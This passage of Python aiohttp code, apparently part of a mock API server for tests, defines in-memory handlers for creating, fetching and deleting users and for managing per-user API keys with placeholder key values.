
    async def createUser(self, request: web.Request) -> web.Response:
        body = request[RECORD]["json"] or {}
        if not body.get("username") and not body.get("email"):
            return _err(400, "INVALID", "A username or email is required.")
        self.counter += 1
        user = {"id": f"user-{self.counter}", "created_at": SUBMITTED, "company_id": "company-1"}
        user.update({k: v for k, v in body.items() if k != "password"})
        self.users[user["id"]] = user
        return web.json_response(user)

    async def getUser(self, request: web.Request) -> web.Response:
        user = self.users.get(request.match_info["uid"])
        if user is None:
            return self._notfound("user")
        return web.json_response(user)

    async def deleteUser(self, request: web.Request) -> web.Response:
        if self.users.pop(request.match_info["uid"], None) is None:
            return self._notfound("user")
        return web.json_response({})

    async def listKeys(self, request: web.Request) -> web.Response:
        uid = request.match_info["uid"]
        if uid not in self.users:
            return self._notfound("user")
        return self._page(request, self.apikeys.get(uid, []))

    async def createKey(self, request: web.Request) -> web.Response:
        uid = request.match_info["uid"]
        if uid not in self.users:
            return self._notfound("user")
        name = (request[RECORD]["json"] or {}).get("name") or "key"
        self.counter += 1
        key = {"name": name, "key": f"newkey{self.counter:034d}"}
        self.apikeys.setdefault(uid, []).append(key)
        return web.json_response(key)

    async def deleteKey(self, request: web.Request) -> web.Response:
        uid, name = request.match_info["uid"], request.match_info["name"]
        keys = self.apikeys.get(uid, [])
        if not any(k["name"] == name for k in keys):
            return self._notfound("apikey")
        self.apikeys[uid] = [k for k in keys if k["name"] != name]
        return web.json_response({})
